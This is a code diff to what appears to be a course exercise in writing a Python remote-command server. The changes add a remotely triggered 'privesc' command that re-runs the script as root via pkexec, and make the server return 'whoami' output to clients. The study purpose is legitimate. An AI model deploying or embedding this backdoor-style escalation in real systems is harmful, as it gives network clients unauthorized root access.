@@ -31,6 +31,13 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
 HOST, PORT = "0.0.0.0", 5050
 
 
+def privesc():
+    if os.getuid() != 0:
+        print("Elevating to root...")
+        subprocess.run(["pkexec", sys.executable, THIS_FILE])
+        sys.exit()
+ 
+
 def kill_others():
     """
     Since a port can only be bound by one program, kill all other programs on this port that we can see.
@@ -89,18 +96,23 @@ def handle_conn(conn, addr):
         # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
-        data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
-
-        if not data:
+        raw_data = conn.recv(1024)
+        if not raw_data:
             return
+        
+        data = raw_data.decode("utf-8", errors="replace").strip()
+
+        print("received: " + data)
+        if data == "privesc":
+            print("Running privesc")
+            privesc()
         
 
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
 
         try:
-            conn.sendall("Response data here".encode())
+            conn.sendall(run_command("whoami").stdout.encode())
             # Process the communication data from 
         except Exception as e:
             conn.sendall(f"error: {e}".encode())
@@ -109,8 +121,7 @@ def handle_conn(conn, addr):
 def main():
     kill_others()
     bootstrap_packages()
-
-
+    
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
@@ -124,7 +135,6 @@ def main():
                 raise
             except:
                 print("Connection died")
-
 
 if __name__ == "__main__":
     main()
